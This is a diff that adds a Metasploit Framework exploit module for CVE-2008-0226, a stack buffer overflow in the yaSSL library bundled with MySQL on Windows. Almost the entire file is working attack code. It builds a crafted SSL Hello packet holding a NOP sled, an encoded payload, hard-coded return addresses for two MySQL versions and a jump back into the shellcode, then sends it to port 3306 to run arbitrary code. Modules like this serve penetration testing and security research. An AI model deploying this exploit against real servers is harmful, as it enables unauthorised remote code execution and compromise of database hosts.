@@ -1,0 +1,87 @@
+##
+# $Id: 
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+
+require 'msf/core'
+
+module Msf
+
+class Exploits::Windows::Mysql::MySQL_yaSSL < Msf::Exploit::Remote
+
+	include Exploit::Remote::Tcp
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'MySQL yaSSL SSL Hello Message Buffer Overflow',
+			'Description'    => %q{
+					This module exploits a stack overflow in the yaSSL (1.7.5 and earlier)
+					implementation bundled with MySQL <= 6.0. By sending a specially crafted
+					Hello packet, an attacker may be able to execute arbitrary code.
+			},
+			'Author'         => [ 'MC' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision:$',
+			'References'     =>
+				[
+					[ 'BID', '27140' ],
+					[ 'CVE', '2008-0226' ],
+				],
+			'Privileged'     => true,
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'thread',
+				},
+			'Payload'        =>
+				{
+					'Space'    => 600,
+					'BadChars' => "\x00\x20\x0a\x0d\x2f\x2b\x0b\x5c",
+					'StackAdjustment' => -3500,
+					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",
+				},
+			'Platform'       => 'win',
+			'Targets'        => 
+				[
+					[ 'MySQL 5.0.45-community-nt',    { 'Ret' => 0x008b9d45 } ],
+					[ 'MySQL 5.1.22-rc-community',    { 'Ret' => 0x008b04c9 } ], 
+				],
+			'DefaultTarget'  => 0,
+			'DisclosureDate' => 'Jan 4 2008'))
+	
+			register_options([ Opt::RPORT(3306) ], self)		
+	end
+
+	def exploit
+		connect
+
+		sock.get_once
+
+		req_uno =  [0x01000020].pack('V')
+
+		req_dos =  [0x00008daa].pack('V') + [0x40000000].pack('V') 
+		req_dos << [0x00000008].pack('V') + [0x00000000].pack('V') 
+		req_dos << [0x00000000].pack('V') + [0x00000000].pack('V') 
+		req_dos << [0x00000000].pack('V') + [0x00000000].pack('V')
+		req_dos << [0x03010000].pack('V') + [0x00000001].pack('V')   
+		req_dos << "\x00\x0F\xFF" + rand_text_alphanumeric(3917 - payload.encoded.length)  
+		req_dos << make_nops(100) + payload.encoded + [target.ret].pack('V') 
+		req_dos << make_nops(16) + [0xe8, -650].pack('CV') + rand_text_alphanumeric(1024)
+
+		print_status("Trying target #{target.name}...")
+
+		sock.put(req_uno)
+		sock.put(req_dos)
+		
+		handler
+		disconnect
+	end
+
+end
+end	
